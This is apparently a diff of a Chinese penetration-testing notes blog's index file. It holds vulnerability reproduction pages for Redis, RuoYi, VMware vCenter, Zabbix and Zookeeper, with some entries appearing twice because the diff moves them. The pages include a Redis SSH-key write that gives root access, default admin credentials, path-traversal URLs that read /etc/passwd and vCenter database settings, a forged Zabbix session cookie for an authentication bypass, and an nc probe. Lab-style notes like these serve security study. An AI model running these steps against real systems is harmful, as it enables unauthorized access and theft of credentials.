+<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.179.130 [-p可指定端口，省略为默认6379]</span><br><span class="line">ping // 若返回 PONG 则表示漏洞存在</span><br><span class="line"></span><br><span class="line">若提示 Redis(error)NOAUTH Authentication required 表示需要身份认证 auth 加密码进行尝试</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写入ssh公钥，获得操作系统权限：</span><br><span class="line">	条件1 : 对方需要开启 ssh 服务</span><br><span class="line">	条件2 : redis 以 root 身份运行</span><br><span class="line"></span><br><span class="line">攻击者</span><br><span class="line">ssh-keygen -t rsa // 本地生成 ssh 密钥</span><br><span class="line">进入 .ssh 目录（上面生成密钥的时候会显示路径）</span><br><span class="line">echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot; &gt; key.txt // 将公钥写入 key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.179.130 -x set crack // 将公钥 key.txt 写入目标 redis</span><br><span class="line">config get dir // 获取靶机服务器 redis 备份路径</span><br><span class="line">config set dir /root/.ssh // 更改 redis 备份路径为 ssh 公钥存放目录，结果返回 OK 代表执行成功</span><br><span class="line">config get dbfilename // 获取当前备份文件名称</span><br><span class="line">config set dbfilename authorized_keys // 更改备份文件名称为 authorized_keys</span><br><span class="line">config get dbfilename // 确认是否修改成功</span><br><span class="line">save // 保存</span><br><span class="line">ssh -i id_rsa root@192.168.179.130 // 利用公钥登录 ssh 服务器，得在 .ssh 目录下执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/05/RZ7cfigbVX1sp3y.png" alt="redis.png"></p>
+<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、登录账户设置复杂的口令；</span><br><span class="line">2、禁止公钥登陆系统；</span><br><span class="line">3、禁止redis服务对外开放</span><br><span class="line">4、设置IP白名单</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>数据库</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Rsync</title>
     <url>/pages/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Rsync.html</url>
     <content><![CDATA[<h1 id="rsync未授权访问">1. rsync未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync 是 linux 系统下的数据镜像备份工具，使用 rsync 可以快速增量备份数据，支持本地复制，或与其他ssh、rsync 主机同步。该协议默认监听873端口，如果目标开启 rsync，并且没有配置 ACL 或访问密码，就可以未授权读写目标服务器文件。</span><br></pre></td></tr></table></figure>
@@ -573,6 +593,45 @@
 ]]></content>
       <categories>
         <category>服务器漏洞</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>RuoYi</title>
+    <url>/pages/CMS/RuoYi.html</url>
+    <content><![CDATA[<h3 id="RuoYi后台默认口令-任意文件读取">0.0.1. RuoYi后台默认口令+任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些情况访问若依后台时网页会已输入账号密码，通常情况为默认口令保存</span><br><span class="line">默认口令 admin/admin123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/hYU6e14y8XOSlus.png"></p>
+<h4 id="漏洞利用：">0.0.1.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录到后台时可以尝试读取下面文件，不一定成功</span><br><span class="line">/common/download/resource?resource=/profile/../../../../etc/passwd // 读取passwd文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="Shiro反序列化">0.0.2. Shiro反序列化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若依后台管理系统基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro。所以也可能存在Shiro反序列化</span><br><span class="line">可到iframe分类shiro中查看文章</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CMS</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Spatial Search Engine</title>
+    <url>/pages/MyTools/SSE.html</url>
+    <content><![CDATA[<h1 id="Spatial-Search-Engine">1. Spatial Search Engine</h1><p>Spatial Search Engine 目前支持 FOFA 和 Hunter 的查询</p>
+<h2 id="功能提醒">1.1. 功能提醒</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">右下角左右箭头只支持中间页码加减功能，翻页后需要点击查询</span><br><span class="line"></span><br><span class="line">Hunter 查询后右上角会显示当前剩余积分，积分=每日免费积分+权益积分</span><br><span class="line"></span><br><span class="line">FOFA 查询后左上角会显示当前用户等级，右下角会显示查询数量</span><br><span class="line">由于考虑到大家应该都买不起企业会员(3w一个月)，这里就不提供蜜罐排查，FID字段结果查询功能等</span><br></pre></td></tr></table></figure>
+
+<h2 id="查询结果">1.2. 查询结果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172354064.png" alt="image-20230111172354064"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172407313.png" alt="image-20230111172407313"></p>
+<h2 id="语法查询">1.3. 语法查询</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172430226.png" alt="image-20230111172430226"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172437462.png" alt="image-20230111172437462"></p>
+<h2 id="结果导出">1.4. 结果导出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">点击数据导出按钮，会在当前对应的result目录下生成assets_当前时间戳.csv文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置文件">1.5. 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动工具会在当前目录下生成 config.yaml 文件，可以在界面中更改也可以在 config.yaml 中更改，API表示网址（末尾不加/）防止如 fofa变更网址的情况</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172539039.png" alt="image-20230111172539039"></p>
+<h2 id="打包">1.6. 打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows 打包命令</span><br><span class="line">go build -ldflags -H=windowsgui main.go </span><br></pre></td></tr></table></figure>
+
+<h2 id="下载">1.7. 下载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github 项目地址 --&gt; https://github.com/qiwentaidi/Spatial-Search-Engine</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>MyTools</category>
       </categories>
   </entry>
   <entry>
@@ -629,65 +688,6 @@
 ]]></content>
       <categories>
         <category>WEB框架</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Redis</title>
-    <url>/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html</url>
-    <content><![CDATA[<h1 id="redis未授权访问">1. redis未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问是因为一些 Redis 服务绑定到公共接口，甚至没有密码身份验证保护。部分 Redis 绑定在0.0.0.0:6379，并且没有开启认证（这是 Redis 的默认配置），而又暴露在公网上，这样就会导致任意用户在可以访问此公网的情况下未授权访问 Redis 以及读取Redis 的数据。</span><br></pre></td></tr></table></figure>
-
-<p>More info : 该服务默认开放端口6379</p>
-<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者 Kali 192.168.179.129 </span><br><span class="line">靶机 ubuntu 192.168.179.130 -- 需安装 redis 环境</span><br><span class="line"></span><br><span class="line">		靶机部署：</span><br><span class="line">		wget http://download.redis.io/releases/redis-3.2.11.tar.gz	// 下载redis安装包</span><br><span class="line">		tar zxvf redis-3.2.11.tar.gz // 解压</span><br><span class="line">		cd redis-3.2.11</span><br><span class="line">		make // 进入解压目录后make执行</span><br><span class="line">		cd src</span><br><span class="line">		sudo cp redis-server /usr/bin </span><br><span class="line">		sudo cp redis-cli /usr/bin // 配置环境变量</span><br><span class="line">		cd ..</span><br><span class="line">		sudo cp redis.conf /etc // 将 redis.conf 复制到 etc 目录下</span><br><span class="line">		vim /etc/redis.conf</span><br><span class="line">			Protected-mode yes 改为 no</span><br><span class="line">			bind 127.0.0.1 之前加上#</span><br><span class="line">		redis-server /etc/redis.conf // 开启 redis 服务</span><br><span class="line">		</span><br><span class="line">		sudo apt install openssh-server // 安装 ssh 服务</span><br><span class="line">		systemctl start sshd</span><br></pre></td></tr></table></figure>
-
-<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.179.130 [-p可指定端口，省略为默认6379]</span><br><span class="line">ping // 若返回 PONG 则表示漏洞存在</span><br><span class="line"></span><br><span class="line">若提示 Redis(error)NOAUTH Authentication required 表示需要身份认证 auth 加密码进行尝试</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">写入ssh公钥，获得操作系统权限：</span><br><span class="line">	条件1 : 对方需要开启 ssh 服务</span><br><span class="line">	条件2 : redis 以 root 身份运行</span><br><span class="line"></span><br><span class="line">攻击者</span><br><span class="line">ssh-keygen -t rsa // 本地生成 ssh 密钥</span><br><span class="line">进入 .ssh 目录（上面生成密钥的时候会显示路径）</span><br><span class="line">echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot; &gt; key.txt // 将公钥写入 key.txt</span><br><span class="line">cat key.txt | redis-cli -h 192.168.179.130 -x set crack // 将公钥 key.txt 写入目标 redis</span><br><span class="line">config get dir // 获取靶机服务器 redis 备份路径</span><br><span class="line">config set dir /root/.ssh // 更改 redis 备份路径为 ssh 公钥存放目录，结果返回 OK 代表执行成功</span><br><span class="line">config get dbfilename // 获取当前备份文件名称</span><br><span class="line">config set dbfilename authorized_keys // 更改备份文件名称为 authorized_keys</span><br><span class="line">config get dbfilename // 确认是否修改成功</span><br><span class="line">save // 保存</span><br><span class="line">ssh -i id_rsa root@192.168.179.130 // 利用公钥登录 ssh 服务器，得在 .ssh 目录下执行</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/05/RZ7cfigbVX1sp3y.png" alt="redis.png"></p>
-<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、登录账户设置复杂的口令；</span><br><span class="line">2、禁止公钥登陆系统；</span><br><span class="line">3、禁止redis服务对外开放</span><br><span class="line">4、设置IP白名单</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>数据库</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Spatial Search Engine</title>
-    <url>/pages/MyTools/SSE.html</url>
-    <content><![CDATA[<h1 id="Spatial-Search-Engine">1. Spatial Search Engine</h1><p>Spatial Search Engine 目前支持 FOFA 和 Hunter 的查询</p>
-<h2 id="功能提醒">1.1. 功能提醒</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">右下角左右箭头只支持中间页码加减功能，翻页后需要点击查询</span><br><span class="line"></span><br><span class="line">Hunter 查询后右上角会显示当前剩余积分，积分=每日免费积分+权益积分</span><br><span class="line"></span><br><span class="line">FOFA 查询后左上角会显示当前用户等级，右下角会显示查询数量</span><br><span class="line">由于考虑到大家应该都买不起企业会员(3w一个月)，这里就不提供蜜罐排查，FID字段结果查询功能等</span><br></pre></td></tr></table></figure>
-
-<h2 id="查询结果">1.2. 查询结果</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172354064.png" alt="image-20230111172354064"></p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172407313.png" alt="image-20230111172407313"></p>
-<h2 id="语法查询">1.3. 语法查询</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172430226.png" alt="image-20230111172430226"></p>
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172437462.png" alt="image-20230111172437462"></p>
-<h2 id="结果导出">1.4. 结果导出</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">点击数据导出按钮，会在当前对应的result目录下生成assets_当前时间戳.csv文件</span><br></pre></td></tr></table></figure>
-
-<h2 id="配置文件">1.5. 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动工具会在当前目录下生成 config.yaml 文件，可以在界面中更改也可以在 config.yaml 中更改，API表示网址（末尾不加/）防止如 fofa变更网址的情况</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172539039.png" alt="image-20230111172539039"></p>
-<h2 id="打包">1.6. 打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows 打包命令</span><br><span class="line">go build -ldflags -H=windowsgui main.go </span><br></pre></td></tr></table></figure>
-
-<h2 id="下载">1.7. 下载</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Github 项目地址 --&gt; https://github.com/qiwentaidi/Spatial-Search-Engine</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>MyTools</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>RuoYi</title>
-    <url>/pages/CMS/RuoYi.html</url>
-    <content><![CDATA[<h3 id="RuoYi后台默认口令-任意文件读取">0.0.1. RuoYi后台默认口令+任意文件读取</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些情况访问若依后台时网页会已输入账号密码，通常情况为默认口令保存</span><br><span class="line">默认口令 admin/admin123</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/06/hYU6e14y8XOSlus.png"></p>
-<h4 id="漏洞利用：">0.0.1.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录到后台时可以尝试读取下面文件，不一定成功</span><br><span class="line">/common/download/resource?resource=/profile/../../../../etc/passwd // 读取passwd文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="Shiro反序列化">0.0.2. Shiro反序列化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若依后台管理系统基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro。所以也可能存在Shiro反序列化</span><br><span class="line">可到iframe分类shiro中查看文章</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>CMS</category>
       </categories>
   </entry>
   <entry>
@@ -836,27 +836,6 @@
       </categories>
   </entry>
   <entry>
-    <title>vmware-vcenter</title>
-    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Vmware-vcenter.html</url>
-    <content><![CDATA[<h3 id="任意文件读取">0.0.1. 任意文件读取</h3><h4 id="windows">0.0.1.1. windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174608979.png" alt="image-20220916174608979"></p>
-<h4 id="linux">0.0.1.2. linux</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=/etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174733158.png" alt="image-20220916174733158"></p>
-<h3 id="任意文件上传CVE-2021-21972">0.0.2. 任意文件上传CVE-2021-21972</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ui/vropspluginui/rest/services/uploadova存在任意文件上传漏洞</span><br><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
-
-<h3 id="远程代码执行CVE-2021-21985">0.0.3. 远程代码执行CVE-2021-21985</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174450563.png" alt="image-20220916174450563"></p>
-<h3 id="任意文件上传CVE-2021-22005">0.0.4. 任意文件上传CVE-2021-22005</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>网络设备</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Weblogic</title>
     <url>/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/WebLogic.html</url>
     <content><![CDATA[<h1 id="Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）">1. Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。</span><br></pre></td></tr></table></figure>
@@ -891,52 +870,6 @@
       <tags>
         <tag>GetShell</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Zookeeper</title>
-    <url>/pages/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Zookeeper.html</url>
-    <content><![CDATA[<h1 id="zookeeper未授权访问">1. zookeeper未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zookeeper 未授权访问是指安装部署之后默认情况下不需要任何身份验证，从而导致 zookeeper 被远程利用，导致大量服务级别的信息泄露。</span><br></pre></td></tr></table></figure>
-
-<p>More info : 该服务默认开放端口2181</p>
-<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>echo envi | nc x.x.x.x 2181</code></p>
-<p><img src="https://s2.loli.net/2022/07/04/Ovxwn9J8fBjR1HY.png"></p>
-<p>More info : 可利用空间搜索引擎快速判定 zookeeper 服务是存在未授权访问漏洞</p>
-<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止把Zookeeper直接暴露在公网</span><br><span class="line">2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>服务器漏洞</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Zabbix</title>
-    <url>/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html</url>
-    <content><![CDATA[<h1 id="zabbix认证绕过漏洞（CVE-2022-23131）">1. zabbix认证绕过漏洞（CVE-2022-23131）</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</span><br></pre></td></tr></table></figure>
-
-<p><code>fofa:app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</code></p>
-<p><img src="https://s2.loli.net/2022/07/25/RyFqEgfjbirVC4I.png" alt="image-20220725005801979"></p>
-<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.0.36</span><br><span class="line"></span><br><span class="line">5.4.0</span><br><span class="line"></span><br><span class="line">5.4.8</span><br><span class="line"></span><br><span class="line">6.0.0alpha1</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><p><img src="https://s2.loli.net/2022/07/25/ad2ioMbjwvIV7Y8.png" alt="image-20220725005445702"></p>
-<p>通过请求原始页面，获取zbx_session字段的值为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJzZXNzaW9uaWQiOiJlM2NlNDY4ZjE3NjMyZjBkNTgxZjdjZDEyNmJlNGM1YSIsInNpZ24iOiI4M2FkMTc1YjE1ZGNkNTJkMDI1NDljYjRiYzRkN2FmMGFjYTY5ZTIzNWYyODg3NjY5ZjdiMjA4OTRiN2RiNGFjIn0%3D</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/25/bDujAFrL7sd5lgE.png" alt="image-20220725020207605"></p>
-<p>先进行URL解码（%3D为&#x3D;）再将值进行base64解码</p>
-<p><img src="https://s2.loli.net/2022/07/25/MlZWt9Cjeun17Vs.png" alt="image-20220725011909395"></p>
-<p>解码成功后构造payload，将解码后的参数值替换下方参数值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;4e468962568f645232585a9d73532bf1&quot;,&quot;sign&quot;:&quot;e5a421ca587c0539c9f83560ab9975496109ca2ac71f781eff47c656b165e2c8&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再将上方值进行base64编码</p>
-<p><img src="https://s2.loli.net/2022/07/25/vdrF6nDXYA39wCI.png" alt="image-20220725013812468"></p>
-<p>构造payload，将Cookie字段替换成下列payload再发送数据包，即可登录成功（本文测试站点不存在该漏洞）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNGU0Njg5NjI1NjhmNjQ1MjMyNTg1YTlkNzM1MzJiZjEiLCJzaWduIjoiZTVhNDIxY2E1ODdjMDUzOWM5ZjgzNTYwYWI5OTc1NDk2MTA5Y2EyYWM3MWY3ODFlZmY0N2M2NTZiMTY1ZTJjOCJ9</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2022/07/25/2thvQGZbRenSiCm.png" alt="image-20220725020834242"></p>
-]]></content>
-      <categories>
-        <category>WEB应用</category>
-      </categories>
   </entry>
   <entry>
     <title>Tomcat</title>
@@ -978,6 +911,260 @@
 ]]></content>
       <categories>
         <category>中间件</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>vmware-vcenter</title>
+    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Vmware-vcenter.html</url>
+    <content><![CDATA[<h3 id="任意文件读取">0.0.1. 任意文件读取</h3><h4 id="windows">0.0.1.1. windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174608979.png" alt="image-20220916174608979"></p>
+<h4 id="linux">0.0.1.2. linux</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/eam/vib?id=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174733158.png" alt="image-20220916174733158"></p>
+<h3 id="任意文件上传CVE-2021-21972">0.0.2. 任意文件上传CVE-2021-21972</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ui/vropspluginui/rest/services/uploadova存在任意文件上传漏洞</span><br><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程代码执行CVE-2021-21985">0.0.3. 远程代码执行CVE-2021-21985</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220916174450563.png" alt="image-20220916174450563"></p>
+<h3 id="任意文件上传CVE-2021-22005">0.0.4. 任意文件上传CVE-2021-22005</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用railgun工具</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网络设备</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Zabbix</title>
+    <url>/pages/WEB%E5%BA%94%E7%94%A8/Zabbix.html</url>
+    <content><![CDATA[<h1 id="zabbix认证绕过漏洞（CVE-2022-23131）">1. zabbix认证绕过漏洞（CVE-2022-23131）</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zabbix是拉脱维亚Zabbix SIA公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。Zabbix Frontend 存在安全漏洞，该漏洞源于在启用 SAML SSO 身份验证（非默认）的情况下，恶意行为者可以修改会话数据，因为存储在会话中的用户登录未经过验证。 未经身份验证的恶意攻击者可能会利用此问题来提升权限并获得对 Zabbix 前端的管理员访问权限。</span><br></pre></td></tr></table></figure>
+
+<p><code>fofa:app=&quot;ZABBIX-监控系统&quot; &amp;&amp; body=&quot;saml&quot;</code></p>
+<p><img src="https://s2.loli.net/2022/07/25/RyFqEgfjbirVC4I.png" alt="image-20220725005801979"></p>
+<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.0.36</span><br><span class="line"></span><br><span class="line">5.4.0</span><br><span class="line"></span><br><span class="line">5.4.8</span><br><span class="line"></span><br><span class="line">6.0.0alpha1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><p><img src="https://s2.loli.net/2022/07/25/ad2ioMbjwvIV7Y8.png" alt="image-20220725005445702"></p>
+<p>通过请求原始页面，获取zbx_session字段的值为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJzZXNzaW9uaWQiOiJlM2NlNDY4ZjE3NjMyZjBkNTgxZjdjZDEyNmJlNGM1YSIsInNpZ24iOiI4M2FkMTc1YjE1ZGNkNTJkMDI1NDljYjRiYzRkN2FmMGFjYTY5ZTIzNWYyODg3NjY5ZjdiMjA4OTRiN2RiNGFjIn0%3D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/25/bDujAFrL7sd5lgE.png" alt="image-20220725020207605"></p>
+<p>先进行URL解码（%3D为&#x3D;）再将值进行base64解码</p>
+<p><img src="https://s2.loli.net/2022/07/25/MlZWt9Cjeun17Vs.png" alt="image-20220725011909395"></p>
+<p>解码成功后构造payload，将解码后的参数值替换下方参数值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;4e468962568f645232585a9d73532bf1&quot;,&quot;sign&quot;:&quot;e5a421ca587c0539c9f83560ab9975496109ca2ac71f781eff47c656b165e2c8&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再将上方值进行base64编码</p>
+<p><img src="https://s2.loli.net/2022/07/25/vdrF6nDXYA39wCI.png" alt="image-20220725013812468"></p>
+<p>构造payload，将Cookie字段替换成下列payload再发送数据包，即可登录成功（本文测试站点不存在该漏洞）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNGU0Njg5NjI1NjhmNjQ1MjMyNTg1YTlkNzM1MzJiZjEiLCJzaWduIjoiZTVhNDIxY2E1ODdjMDUzOWM5ZjgzNTYwYWI5OTc1NDk2MTA5Y2EyYWM3MWY3ODFlZmY0N2M2NTZiMTY1ZTJjOCJ9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/25/2thvQGZbRenSiCm.png" alt="image-20220725020834242"></p>
+]]></content>
+      <categories>
+        <category>WEB应用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Zookeeper</title>
+    <url>/pages/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Zookeeper.html</url>
+    <content><![CDATA[<h1 id="zookeeper未授权访问">1. zookeeper未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zookeeper 未授权访问是指安装部署之后默认情况下不需要任何身份验证，从而导致 zookeeper 被远程利用，导致大量服务级别的信息泄露。</span><br></pre></td></tr></table></figure>
+
+<p>More info : 该服务默认开放端口2181</p>
+<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>echo envi | nc x.x.x.x 2181</code></p>
+<p><img src="https://s2.loli.net/2022/07/04/Ovxwn9J8fBjR1HY.png"></p>
+<p>More info : 可利用空间搜索引擎快速判定 zookeeper 服务是存在未授权访问漏洞</p>
